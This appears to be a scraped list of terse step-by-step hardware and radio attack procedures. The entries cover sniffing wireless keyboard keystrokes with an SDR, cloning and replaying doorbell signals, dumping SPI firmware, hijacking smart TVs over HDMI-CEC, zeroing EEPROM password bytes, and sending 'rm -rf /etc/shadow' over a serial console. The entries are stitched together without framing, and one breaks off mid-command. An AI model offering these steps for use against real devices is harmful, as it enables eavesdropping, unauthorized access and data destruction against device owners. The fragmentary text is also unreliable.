Step 1: Connect RTL-SDR dongle to attacker system. Step 2: Use GQRX to identify active 2.4GHz frequencies. Step 3: Record signal bursts using Inspectrum. Step 4: Analyze bursts to decode raw binary keystrokes. Step 5: Match binary patterns to typed characters using custom scripts.

Step 1: Connect RTL-SDR dongle to your laptop and launch GQRX.Step 2: Press the wireless doorbell button and locate the RF spike (usually 433 MHz band).Step 3: Record the RF waveform using GQRX or command-line tools.Step 4: Open the recorded file in Audacity or Inspectrum to visualize waveform characteristics and timings.Step 5: Import signal into URH to extract bitstream and protocol structure.Step 6: Decode the waveform and note the packet pattern that corresponds to a button press.Step 7: Replay the extracted bitstream using HackRF or generate a Python-based SDR transmitter.Step 8: When replayed, observe if the receiver activates the chime—proving successful cloning.Step 9: Try slight alterations in timing or payload to test device sensitivity.

Step 1: Connect Raspberry Pi GPIOs to SPI lines (MOSI, MISO, CLK, GND). Step 2: Write or use existing Python script to log traffic. Step 3: Power on device and record firmware communication. Step 4: Reconstruct captured binary using saved logs. Step 5: Analyze with binwalk and test logic flaws in virtualized environment.

Step 1: Connect Raspberry Pi to TV using HDMI.Step 2: Use cec-client to send crafted CEC commands.Step 3: Commands like volume, source change, shutdown can be abused.Step 4: Send loop commands to disable remote usage.Step 5: Exploit auto-play features to launch content.Step 6: If TV runs smart OS, trigger app launch remotely.Step 7: Maintain control via boot-on-CEC.
Step 1: Connect Raspberry Pi via HDMI cable to target Smart TV.Step 2: Install cec-utils on Raspberry Pi.Step 3: Use command like `echo "on 0"

Step 1: Connect SDR dongle to Android phone using OTG. Step 2: Open SDRTouch app and tune to 2.4GHz band. Step 3: Use built-in waterfall view to find burst signals. Step 4: Record signal data and export it. Step 5: Use offline decoding tool to parse keystrokes from waveforms.

Step 1: Connect SOIC clip to EEPROM (e.g., 24C02). Step 2: Use AsProgrammer to read existing config. Step 3: Identify and zero out password bytes. Step 4: Write modified config to EEPROM. Step 5: Reboot device — login credentials reset.

Step 1: Connect TX/RX/GND to serial header. Step 2: Open serial terminal and observe login prompt. Step 3: Send commands like reboot, rm -rf /etc/shadow. Step 4: If no login required, system immediately processes input.
